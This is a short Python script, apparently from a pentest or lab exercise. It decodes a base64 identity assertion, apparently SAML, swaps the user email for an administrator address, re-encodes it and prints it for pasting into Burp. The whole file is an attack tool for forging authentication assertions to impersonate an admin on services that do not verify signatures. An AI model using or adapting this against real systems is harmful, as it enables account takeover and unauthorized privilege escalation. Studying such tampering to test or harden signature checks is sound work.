import base64

old = 'a@a.com'
new = 'admin@libcurl.so'
encode = 'utf-8'

# Get an assertion in b64 format (string type), a string to replace and a new string.
def replace(assertion, old_s, new_s, encode):
    # Decode assertion, returned type is bytes.
    asse_d = base64.b64decode(assertion)
    # Decode secuence of bytes as utf-8, and make the string replaces.
    asse_d = asse_d.decode(encode).replace(old_s,new_s)
    asse_e = base64.b64encode(bytes(asse_d,encoding=encode))
    # return as string to paste in burp ;)
    return asse_e.decode(encode)

print(replace(input(), old, new, encode))